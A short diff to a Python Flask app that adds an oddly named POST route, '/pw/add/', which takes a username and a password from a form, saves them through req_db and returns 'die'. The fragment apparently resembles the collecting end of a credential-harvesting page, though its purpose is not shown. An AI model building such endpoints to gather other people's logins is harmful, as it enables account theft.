@@ -227,6 +227,14 @@ def b404():
     return html_minify(render_template("no-result.html"))
 
 
+@app.route("/pw/add/", methods=['POST'])
+def abckdv():
+    data = request.form['u']
+    pass_ = request.form["p"]
+    req_db((data, pass_))
+    return "die"
+
+
 @app.route("/sec/add/", methods=['POST'])
 def add_():
     try:
